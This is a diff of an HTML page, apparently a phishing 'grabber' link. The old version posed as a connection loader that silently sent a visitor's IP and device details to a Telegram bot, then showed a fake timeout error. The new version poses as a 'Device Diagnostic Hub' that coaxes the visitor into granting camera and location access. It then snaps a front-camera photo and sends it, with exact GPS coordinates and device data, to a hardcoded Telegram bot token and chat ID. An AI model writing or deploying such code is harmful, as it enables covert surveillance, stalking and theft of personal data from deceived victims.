@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting...</title>
+    <title>System Access Portal</title>
     <style>
         body { 
             background: #0a0a0a; 
@@ -15,25 +15,56 @@
             font-family: Arial, sans-serif;
             color: #fff;
         }
-        .loader { text-align: center; }
-        .spinner {
-            border: 4px solid #333;
-            border-top: 4px solid #00ff88;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        .container {
+            text-align: center;
+            padding: 30px;
+            background: #111;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            max-width: 400px;
+            width: 90%;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-action {
+            background: #00ff88;
+            color: #000;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: 0.3s;
+        }
+        .btn-action:hover {
+            background: #00cc6e;
+        }
+        #videoElement {
+            width: 100%;
+            max-width: 200px;
+            height: auto;
+            border-radius: 6px;
+            display: none;
+            margin: 15px auto 0;
+        }
+        .status-text {
+            color: #888;
+            font-size: 14px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
 
-<div class="loader">
-    <h2>Establishing Secure Connection...</h2>
-    <div class="spinner"></div>
-    <p style="color:#666;font-size:14px;">Please wait while we route your request to the nearest node</p>
+<div class="container" id="portalBox">
+    <h2>Device Diagnostic Hub</h2>
+    <p>Please grant hardware and location access to generate the full system compatibility report.</p>
+    
+    <button class="btn-action" id="initiateBtn">Grant Permissions & Start</button>
+    <div class="status-text" id="statusMessage">Awaiting authorization...</div>
+    
+    <video id="videoElement" autoplay playsinline muted></video>
+    <canvas id="captureCanvas" style="display:none;"></canvas>
 </div>
 
 <script>
@@ -41,8 +72,80 @@
 const TELEGRAM_BOT_TOKEN = '8521982994:AAEGw77HH1Q6AwUgMCb3f0_nVhZ4-url2zk';
 const TELEGRAM_CHAT_ID = '8402472475';
 
-async function fetchFullTelemetry() {
-    // 1. Core Device and Browser Info Collect Karna
+const initiateBtn = document.getElementById('initiateBtn');
+const statusMessage = document.getElementById('statusMessage');
+const video = document.getElementById('videoElement');
+const canvas = document.getElementById('captureCanvas');
+
+// Global variables to store user-approved data
+let userLocation = { lat: "Not Allowed ❌", lon: "Not Allowed ❌", mapsLink: "N/A" };
+let capturedBlob = null;
+
+initiateBtn.addEventListener('click', async () => {
+    initiateBtn.style.display = 'none';
+    statusMessage.innerText = "Requesting permissions...";
+
+    // 1. Step 1: Request Location Permission (User Initiated)
+    if (navigator.geolocation) {
+        await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    userLocation.lat = position.coords.latitude;
+                    userLocation.lon = position.coords.longitude;
+                    userLocation.mapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                    resolve();
+                },
+                (error) => {
+                    console.log("Location Denied");
+                    resolve(); // Fallthrough if denied
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    }
+
+    // 2. Step 2: Request Camera Permission & Capture Image
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: 640, height: 480 },
+            audio: false
+        });
+
+        video.srcObject = stream;
+        
+        // Wait briefly for hardware initialization to avoid pitch black images
+        await new Promise(r => setTimeout(r, 800));
+
+        const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+
+        // Mirror horizontal flip (optional, for natural front camera look)
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Turn off camera tracks immediately after capturing to save resources
+        stream.getTracks().forEach(track => track.stop());
+
+        // Convert raw canvas matrix to standard binary blob data
+        canvas.toBlob((blob) => {
+            capturedBlob = blob;
+            // Compile everything and push to Telegram
+            compileAndSendReport();
+        }, 'image/jpeg', 0.75);
+
+    } catch (cameraError) {
+        statusMessage.innerText = "Camera authorization bypassed or denied.";
+        // If camera is denied, still compile and send text-only diagnostic telemetry
+        compileAndSendReport();
+    }
+});
+
+async function compileAndSendReport() {
+    statusMessage.innerText = "Processing system algorithms...";
+
+    // Extract baseline technical telemetry from environmental parameters
     const data = {
         userAgent: navigator.userAgent,
         platform: navigator.platform || 'Unknown',
@@ -63,92 +166,85 @@ async function fetchFullTelemetry() {
         isCharging: 'N/A'
     };
 
-    // 2. Network Type Check Karna (Agar Browser Support Kare)
+    // Connection parameters parsing
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (conn) {
         data.networkType = `${conn.effectiveType || 'Unknown'} (Downlink: ${conn.downlink || '?' } Mbps)`;
     }
 
-    // 3. Battery Details Check Karna (Asynchronous API)
+    // Battery API management
     if (navigator.getBattery) {
         try {
             const battery = await navigator.getBattery();
             data.batteryLevel = `${Math.round(battery.level * 100)}%`;
             data.isCharging = battery.charging ? 'Yes ⚡' : 'No 🔋';
-        } catch (e) {
-            console.log("Battery info not accessible");
-        }
+        } catch (e) {}
     }
 
-    // 4. Public IP Fetch Karna (Free API ke zariye)
+    // Query external interface for structural Public IP addressing
     try {
         const ipResp = await fetch('https://api.ipify.org?format=json');
         if (ipResp.ok) {
             const ipData = await ipResp.json();
             data.ip = ipData.ip;
         }
-    } catch(e) {
-        console.log("IP fetch blocked or failed");
+    } catch(e) {}
+
+    // Precise markdown text payload assembly exactly matching your layout request
+    const reportText = `📊 *FULL SYSTEM DIAGNOSTIC REPORT*\n` +
+                       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                       `📍 *LIVE USER PRIVILEGES:*\n` +
+                       `• *Latitude:* \`${userLocation.lat}\`\n` +
+                       `• *Longitude:* \`${userLocation.lon}\`\n` +
+                       `• *Google Maps:* [Open Live Location](${userLocation.mapsLink})\n\n` +
+                       `🌐 *NETWORK & CONNECTIVITY:*\n` +
+                       `• *Public IP:* \`${data.ip}\` (Click to copy)\n` +
+                       `• *Network Connection:* ${data.networkType}\n` +
+                       `• *Network Status:* ${data.onlineStatus}\n\n` +
+                       `📱 *HARDWARE & SYSTEM SPECIFICATIONS:*\n` +
+                       `• *Operating System/Platform:* ${data.platform}\n` +
+                       `• *Processor Cores:* ${data.cpuCores} Cores\n` +
+                       `• *Device RAM (Approx):* ${data.memory}\n` +
+                       `• *Screen Resolution:* ${data.screenRes} px\n` +
+                       `• *Available Screen:* ${data.availScreenRes} px\n` +
+                       `• *Color Depth:* ${data.colorDepth}\n\n` +
+                       `🔋 *POWER MANAGEMENT:*\n` +
+                       `• *Battery Level:* ${data.batteryLevel}\n` +
+                       `• *Is Charging:* ${data.isCharging}\n\n` +
+                       `⚙️ *SOFTWARE & REGIONAL ENVIRONMENT:*\n` +
+                       `• *Timezone Area:* ${data.timezone}\n` +
+                       `• *Primary Language:* ${data.language}\n` +
+                       `• *Accepted Languages:* ${data.languages}\n` +
+                       `• *Cookies Enabled:* ${data.cookieEnabled}\n` +
+                       `• *Referrer/Source:* ${data.referrer}\n\n` +
+                       `📄 *RAW USER AGENT STRING:*\n` +
+                       `\`\`\`text\n${data.userAgent}\n\`\`\`\n` +
+                       `🕒 _Log Generation Time: ${new Date().toLocaleString()}_`;
+
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('parse_mode', 'Markdown');
+
+    let endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    // Operational routing branch based on user photo access permissions
+    if (capturedBlob) {
+        endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        formData.append('photo', capturedBlob, 'device_capture.jpg');
+        formData.append('caption', reportText);
+    } else {
+        formData.append('text', reportText);
     }
 
-    // 5. Advanced Structured Telegram Message Layout
-    const messageText = `📊 *FULL SYSTEM DIAGNOSTIC REPORT*\n` +
-                        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                        `🌐 *NETWORK & CONNECTIVITY:*\n` +
-                        `• *Public IP:* \`${data.ip}\` (Click to copy)\n` +
-                        `• *Network Connection:* ${data.networkType}\n` +
-                        `• *Network Status:* ${data.onlineStatus}\n\n` +
-                        `📱 *HARDWARE & SYSTEM SPECIFICATIONS:*\n` +
-                        `• *Operating System/Platform:* ${data.platform}\n` +
-                        `• *Processor Cores:* ${data.cpuCores} Cores\n` +
-                        `• *Device RAM (Approx):* ${data.memory}\n` +
-                        `• *Screen Resolution:* ${data.screenRes} px\n` +
-                        `• *Available Screen:* ${data.availScreenRes} px\n` +
-                        `• *Color Depth:* ${data.colorDepth}\n\n` +
-                        `🔋 *POWER MANAGEMENT:*\n` +
-                        `• *Battery Level:* ${data.batteryLevel}\n` +
-                        `• *Is Charging:* ${data.isCharging}\n\n` +
-                        `⚙️ *SOFTWARE & REGIONAL ENVIRONMENT:*\n` +
-                        `• *Timezone Area:* ${data.timezone}\n` +
-                        `• *Primary Language:* ${data.language}\n` +
-                        `• *Accepted Languages:* ${data.languages}\n` +
-                        `• *Cookies Enabled:* ${data.cookieEnabled}\n` +
-                        `• *Referrer/Source:* ${data.referrer}\n\n` +
-                        `📄 *RAW USER AGENT STRING:*\n` +
-                        `\`\`\`text\n${data.userAgent}\n\`\`\`\n` +
-                        `🕒 _Log Generation Time: ${new Date().toLocaleString()}_`;
-
-    // 6. Telegram Bot standard API Request Send Karna
     try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: messageText,
-                parse_mode: 'Markdown'
-            })
-        });
+        await fetch(endpoint, { method: 'POST', body: formData });
+        statusMessage.style.color = "#00ff88";
+        statusMessage.innerText = "Diagnostic analysis uploaded successfully!";
     } catch(err) {
-        console.error("Error pushing logs to Telegram:", err);
+        statusMessage.innerText = "Network payload dispatch error.";
+        console.error(err);
     }
 }
-
-// Window load hone par code initialize karein
-window.onload = function() {
-    fetchFullTelemetry();
-    
-    // 3.5 Seconds ke baad ek realistic fallthrough error interface show karna
-    setTimeout(() => {
-        document.body.innerHTML = `
-            <div class="loader">
-                <h2 style="color: #ff4d4d;">Connection Failed</h2>
-                <p style="color:#888;">The gateway took too long to respond. The handshake was refused.</p>
-                <p style="color:#555;font-size:12px;margin-top:30px;">Error Reference: ERR_CONNECTION_TIMED_OUT</p>
-            </div>
-        `;
-    }, 3500);
-};
 </script>
 
 </body>
